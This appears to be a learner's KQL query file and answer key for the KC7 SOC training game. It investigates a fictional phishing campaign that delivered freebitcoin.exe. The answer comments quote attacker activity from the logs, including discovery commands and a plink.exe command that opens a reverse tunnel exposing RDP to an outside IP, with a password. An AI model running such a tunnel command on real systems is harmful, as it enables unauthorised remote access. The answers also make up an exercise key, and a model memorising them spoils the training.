////World Domination Nation////
///KC7 - Section 1: KQL 101 👼
///🥳 Today is your first day as a Junior Security Operations Center (SOC) Analyst with our company. Your primary job responsibility is to defend WDN Consulting and our employees from malicious cyber actors.
///World Domination Nation, a woman-led consulting powerhouse, propels individuals and organizations to unleash their potential through visionary "world domination plans." Through our diverse projects, World Domination Nation showcases the remarkable impact of our empowering approach, reshaping industries and inspiring positive global change.
///WDN Consulting has been laser-focused on broadening our customer base. Recently, though, we have been getting a lot of attention. All this extra attention has brought along some unwelcome visitors- cyber attackers! That’s why we’ve hired you! To help keep us safe!
///Let's start some KQL review. You can skip this if you've done it before.
///Do a take 10 on all the other tables to see what kind of data they contain. Enter done when you are finished.

//Do a take 10 on all the other tables to see what kind of data they contain. Enter done when you are finished.

search *
| distinct $table

FileCreationEvents
|take 10

Employees
|take 10

OutboundNetworkEvents
|take 10

SecurityAlerts
|take 10

AuthenticationEvents
|take 10

InboundNetworkEvents
|take 10

Email
|take 10

ProcessEvents
|take 10

PassiveDns
|take 10

//if need 10 rows from each table

union
    (FileCreationEvents | take 10),
    (Employees | take 10),
    (OutboundNetworkEvents | take 10),
    (SecurityAlerts | take 10),
    (AuthenticationEvents | take 10),
    (InboundNetworkEvents | take 10),
    (Email | take 10),
    (ProcessEvents | take 10),
    (PassiveDns | take 10)

//How many employees are in the company?
Employees
| count //1234

//Each employee at WDN Consulting is assigned an IP address.
Employees
| where ip_addr == "10.10.0.40"
//Tanisha ODonoghue; tanisha_odonoghue@wdnconsulting.com; taodonoghue; Chief Strategy Officer; ZBC6-MACHINE

//How many emails did Gloria Gould receive?
Employees
| where name contains "Gloria Gould" //10.10.0.66; gloria_gould@wdnconsulting.com; glgould, IT Analyst; 022L-MACHINE

Email
| where recipient == "gloria_gould@wdnconsulting.com"
|count //45

//How many distinct senders were seen in the email logs from kayseeseven.com?
Email
| where sender contains "kayseeseven.com"
| distinct sender
| count //3285

//How many unique URLs did “Judith Sower” visit?
Employees
| where name contains "Judith Sower"
| project ip_addr //ip_addr == 10.10.0.130 ; src_ip == 10.10.0.130
//then
OutboundNetworkEvents
  | where src_ip == "10.10.0.130"
  | summarize UniqueURLCount = dcount(url)

  //96

// employee and Outbound together using Let

let userIp = Employees
  | where name contains "Judith Sower"
  | project ip_addr;
OutboundNetworkEvents
  | where src_ip in (userIp)
  | summarize UniqueURLCount = dcount(url)

//How many domains in the PassiveDns records contain the word “crypto”?
PassiveDns
| where domain contains "crypto"
| summarize UniqueURLCount = dcount(domain) //36

//What IPs did the domain “cryptocoin.net” resolve to (enter any one of them)?
PassiveDns
| where domain contains "cryptocoin.net"
| distinct ip //193.46.203.153; 22.160.111.66; 218.51.95.7

//How many unique URLs were browsed by employees named “Karen”?
let userIp = Employees
  | where name contains "Karen"
  | project ip_addr;
OutboundNetworkEvents
  | where src_ip in (userIp)
  | summarize UniqueURLCount = dcount(url) //290

///******************Section 2: Something Phishy*************
//You notice that several security alerts were generated for a file named freebitcoin.exe.
//How many of these alerts were reported?

SecurityAlerts
| where description contains "freebitcoin.exe"
 | summarize UniqueURLCount = dcount(description) //9

// When was the first alert reported?
SecurityAlerts
| where description contains "freebitcoin.exe"
| summarize FirstCreated = min(timestamp), TotalRecords = count() //2023-06-05T13:16:37.000Z

//Which host was this first alert associated with?
SecurityAlerts
| where description contains "freebitcoin.exe"
| where timestamp == "2023-06-05 13:16:37"
| parse description with "host" hostname "." *
| distinct hostname //QU09-DESKTOP

//Which employee does this host belong to?

Employees
| where hostname == "QU09-DESKTOP"
| project name //James Reinhart

//Maybe this freebitcoin.exe file is associated with some suspicious processes on the host found in question 3.
//Check the host for processes created around the time the alert was reported. One of these processes involves the system registry.
//What is this command?

ProcessEvents
| where hostname contains "QU09-DESKTOP"
| where timestamp >= datetime(2023-06-05 13:16:37)

//or///
let alertTime = datetime("2023-06-05 13:16:37");
ProcessEvents
  | where hostname == "QU09-DESKTOP"
  | where timestamp  >= alertTime - 300m and timestamp  <= alertTime + 300m
    | where  process_commandline  contains "reg"
//Response ; reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s  ; 2023-06-05T11:53:37.000Z


//This command (the one from Q5) is used to get information about all the __ that has been installed using Windows Installer on the system.
//software;applications;programs

//A few minutes after this command was run, ipconfig was used to retrieve information about the network configuration of the system.
//What parameter/switch was used with ipconfig?

let alertTime = datetime("2023-06-05 13:16:37");
ProcessEvents
| where hostname == "QU09-DESKTOP"
| where process_commandline  contains "ipconfig"
| where timestamp  >= alertTime - 60m and timestamp  <= alertTime + 60m
//ipconfig.exe /all ; time 2023-06-05T12:19:31.000Z

///Several other commands were run on this host around the time freebitcoin.exe appeared, including: whoami, net use, systeminfo, and arp -a.
//These commands likely represent what MITRE ATT&CK tactic? (this is one word)
//discovery

//The adversary may have used a tool to establish a tunnel to remote infrastructure.
//What is the name of the tool used on this host to establish a tunnel?

ProcessEvents
  | where hostname == "QU09-DESKTOP"
  | where process_commandline contains "-R" or process_commandline contains "tunnel" or process_commandline contains "remote"
  //"powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 81.192.242.254 -P 22 -l bitcoinminer -pw Crypto$123 -no-antispoof
  //Response== plink.exe after search on the net it is use for tunnel to remote infrastructure

  //What IP address did this tool connect to?
  //IP: 81.192.242.254

What password was used to establish the tunnel?
//-pw Crypto$123; password Crypto$123

//We've discovered several signs of suspicious activity associated with freebitcoin.exe on this host. Let's see if we can figure out how the file made its way to this system.
//What was the name of the file created on this host shortly before freebitcoin.exe was created?
// 1- we search the time when freebitcoin.exe was created 
FileCreationEvents
| where hostname == "QU09-DESKTOP"
| where filename contains "freebitcoin.exe"
//2023-06-05T13:10:22.000Z  creation time

// 2- we search before  freebitcoin.exe was created 2023-06-05T13:10:22.000Z

let creationTime = datetime("2023-06-05 13:10:22");
FileCreationEvents
| where hostname == "QU09-DESKTOP"
| where timestamp <= creationTime + 5m
| project timestamp, filename, sha256, process_name //HaveYouHeardAboutDogeCoin.docx 2023-06-05T13:09:46.000Z

//What is the SHA256 hash of this file?
///a8145d4fd1534976e060cf8d0e4e206cda61d53f3d3c7f8bb29874532fef8d72

//What is the name of the process that created this file?
//edge.exe

//Hmmm. If an internet browser created the file maybe it was downloaded from somewhere. Check the browsing logs.
//What URL did this employee click to download the file? hostname == "QU09-DESKTOP" src_ip and ip_addr==10.10.4.70

 OutboundNetworkEvents
| where src_ip contains "10.10.4.70" 
| where url contains "HaveYouHeardAboutDogeCoin.docx"
//http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx

//What email address was used to send this link to the user?

Email
| where link contains "http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx"
| project sender //freedom@hotmail.com

//What was the subject line of this email?
Email
| where link contains "http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx"
 //[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.

//That subject line definitely looks suspicious. This likely represents a  phishing attack.
//What was the verdict for this email?
//james_reinhart@wdnconsulting.com regarding him the verdict was CLEAN

//How many other users received emails from this sender email address?
Email
| where sender contains "freedom@hotmail.com"
| distinct recipient //40

//When was the first email sent from this sender?
Email
| where sender contains "freedom@hotmail.com"
| summarize Firstsent = min(timestamp) //2023-06-05T12:59:06.000Z

//When was the last email sent from this sender?
Email
| where sender contains "freedom@hotmail.com"
| summarize lastsent = max(timestamp) //2023-08-02T11:58:16.000Z

//How many different email subjects were used by this sender?
Email
| where sender contains "freedom@hotmail.com"
| distinct subject //5

//Which subject line was used by this sender to target the most employees?

Email
  | where sender contains "freedom@hotmail.com"
  | summarize EmailCount = count() by subject
  | order by EmailCount desc
  | top 1 by EmailCount //[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.

//[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.	14
//[EXTERNAL] Emergency Bitcoin Strategy Activation.	10
//[EXTERNAL] RE:RE: Action Required: Receive Your Bitcoin Payment.	6
//[EXTERNAL] FW: Action Required: Receive Your Bitcoin Payment.	6
//[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!	4

//How many total employees received emails with the subjects you found in question 23?

Email
| where subject contains "[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings" or subject contains "[EXTERNAL] Emergency Bitcoin Strategy Activation" or subject contains "[EXTERNAL] RE:RE: Action Required: Receive Your Bitcoin Payment" or subject contains "[EXTERNAL] FW: Action Required: Receive Your Bitcoin Payment" or subject contains "[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!"
| distinct recipient//109

//How many total employees received emails from this threat actor?

Email
| where subject contains "[EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings" or subject contains "[EXTERNAL] Emergency Bitcoin Strategy Activation" or subject contains "[EXTERNAL] RE:RE: Action Required: Receive Your Bitcoin Payment" or subject contains "[EXTERNAL] FW: Action Required: Receive Your Bitcoin Payment" or subject contains "[EXTERNAL] Urgent: Claim Your Free Bitcoin Now!"
| distinct sender

//sender: freedom@hotmail.com, profit.podcast@hotmail.com, profitprofit@protonmail.com, moon.doge@qq.com , podcastprofit@verizon.com

Email
  | where sender in ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
  | distinct recipient 
  | count //242


//How many distinct domains did the actor use in their emails?
Email
| where sender in ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
| parse link with "://" domain "/" * 
| distinct domain //24

//Which of the domains used by the actor was used most often?

Email
| where sender in ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
| parse link with "://" domain "/" * 
| summarize DomainCount = count() by domain
| order by DomainCount desc
| top 1 by DomainCount //bro-monero.com (DomainCount:39)

//How many total IPs did the domains used by the actor resolve to?
let ip_list =
Email
| where sender in ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
| parse link with "://" domain1 "/" * 
| distinct domain1; //24
PassiveDns
| where domain in (ip_list)
| project timestamp, ip, domain
| distinct ip
|count //35

//How many total domains were hosted on these IPs?

let ip_list =
Email
| where sender in ("freedom@hotmail.com", "profit.podcast@hotmail.com", "profitprofit@protonmail.com", "moon.doge@qq.com", "podcastprofit@verizon.com")
| parse link with "://" domain1 "/" * 
| distinct domain1; //24
PassiveDns
| where domain in (ip_list)
| distinct ip //35 IP


PassiveDns
| where ip =="168.24.157.225" 
| distinct domain //13

